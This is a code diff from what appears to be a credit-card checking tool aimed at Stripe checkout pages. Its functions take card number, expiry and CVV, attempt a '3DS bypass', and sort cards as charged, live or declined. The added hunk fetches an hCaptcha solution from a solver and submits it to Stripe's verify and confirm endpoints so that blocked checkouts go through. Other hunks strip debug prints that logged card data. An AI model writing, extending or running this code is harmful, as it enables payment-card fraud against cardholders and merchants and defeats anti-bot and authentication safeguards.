@@ -515,14 +515,12 @@ async def _create_payment_method(client, pk, cc, mm, yy, cvv, stripe_js_version=
         data = resp.json()
     except Exception as e:
         logger.error(f"PM creation error: {e}")
-        print(f"[CO_DEBUG] PM exception: {e}")
         return None, f"PM request failed: {type(e).__name__}: {str(e)[:50]}", None
 
     if "error" in data:
         err = data["error"]
         code = err.get("code", "unknown")
         msg = err.get("message", "")
-        print(f"[CO_DEBUG] PM error from API: code={code}, msg={msg[:120]}")
         logger.info(f"PM error: {code} - {msg}")
         return None, f"PM: {code}: {msg[:80]}", None
 
@@ -1299,6 +1297,84 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
                     verify_endpoint = f"{STRIPE_API}{verification_url}"
                 else:
                     verify_endpoint = f"{STRIPE_API}/{verification_url}"
+
+                # Stripe will not confirm without a captcha token, so
+                # solve it first.  The other ways round only waste
+                # minutes: the payment intent keeps saying it needs a
+                # challenge.
+                captcha_token = None
+                captcha_page = (f"https://checkout.stripe.com/c/pay/{session_id}?client_secret={cs}"
+                                if session_id else "")
+                try:
+                    from captcha_solver import solve_hcaptcha_enterprise
+                    captcha_token = await solve_hcaptcha_enterprise(
+                        site_key, captcha_page, rqdata=rqdata, session=client)
+                except Exception as e:
+                    logger.info(f"the captcha solve failed: {e}")
+                if not captcha_token:
+                    logger.info("the hCaptcha could not be solved, the checkout stays blocked")
+                    return "live", "hCaptcha Challenge Required"
+                logger.info(f"the captcha token is in hand ({len(captcha_token)} chars)")
+
+                # Hand the token to Stripe and try the confirm again
+                try:
+                    vr = await client.post(verify_endpoint, data={
+                        "client_secret": cs,
+                        "key": pk,
+                        "captcha_vendor_name": "hcaptcha",
+                        "captcha_token": captcha_token,
+                        "passive_captcha_token": captcha_token,
+                        "challenge_response": captcha_token,
+                    }, headers=js_headers, timeout=15)
+                    vr_json = vr.json()
+                    v_status = vr_json.get("status", "")
+                    logger.info(f"  the captcha verify -> HTTP {vr.status_code}, status={v_status}")
+                    if v_status in ("succeeded", "requires_capture", "processing"):
+                        if v_status == "succeeded": return "charged", "Charged (Captcha)"
+                        if v_status == "requires_capture": return "charged", "Authorized (Captcha)"
+                        return "approved", "Processing (Captcha)"
+                    if v_status == "requires_payment_method":
+                        le = vr_json.get("last_setup_error" if intent_type != "payment_intent" else "last_payment_error", {})
+                        if le: return _classify_confirm_error(le)
+                except Exception as e:
+                    logger.info(f"  the captcha verify failed: {e}")
+
+                # The confirm again, this time with the token
+                if session_id:
+                    try:
+                        confirm_data = {"expected_payment_method_type": "card", "key": pk,
+                                        "payment_method": pm_id or "",
+                                        "passive_captcha_token": captcha_token,
+                                        "captcha_token": captcha_token}
+                        if isinstance(amount, (int, float)) and amount is not True:
+                            confirm_data["expected_amount"] = str(int(amount))
+                        cr = await client.post(f"{STRIPE_API}/payment_pages/{session_id}/confirm",
+                                               data=confirm_data, headers=js_headers, timeout=15)
+                        cr_json = cr.json()
+                        logger.info(f"  the confirm with the token -> HTTP {cr.status_code}, status={cr_json.get('status', '')}")
+                        cr_status = cr_json.get("status", "")
+                        if cr_status in ("complete", "succeeded"): return "charged", "Charged (Captcha)"
+                        pi_data = cr_json.get("payment_intent", {})
+                        if isinstance(pi_data, dict):
+                            pi_s = pi_data.get("status", "")
+                            if pi_s == "succeeded": return "charged", "Charged (Captcha)"
+                            if pi_s == "requires_capture": return "charged", "Authorized (Captcha)"
+                            if pi_s == "processing": return "approved", "Processing (Captcha)"
+                            if pi_s == "requires_payment_method":
+                                le = pi_data.get("last_payment_error", {})
+                                if le: return _classify_confirm_error(le)
+                        if "error" in cr_json:
+                            ec = cr_json["error"].get("code", "")
+                            ed = cr_json["error"].get("decline_code", "")
+                            em = cr_json["error"].get("message", "")
+                            logger.info(f"  the confirm with the token error: {ec}/{ed} - {em[:60]}")
+                            if ec == "card_declined" and ed:
+                                if ed in LIVE_DECLINE_CODES: return "live_declined", f"{ed} (Captcha)"
+                                return "declined", f"{ed} (Captcha)"
+                            if ec == "card_declined":
+                                return "declined", "card_declined (Captcha)"
+                    except Exception as e:
+                        logger.info(f"  the confirm with the token failed: {e}")
 
                 # For Checkout: skip verify_challenge (kills SI/PI), go straight to PP bypass
                 # For non-Checkout: try verify_challenge first
@@ -2299,7 +2375,6 @@ async def _check_intent_status(client, pk, client_secret, pm_id, intent_type):
 
 async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, proxy=None):
     start = time.time()
-    print(f"[CO_DEBUG] stripe_co_check called: {cc[:6]}...{mm}|{yy}|{cvv} url={checkout_url[:60]}...")
 
     client_kwargs = {
         "timeout": httpx.Timeout(15),
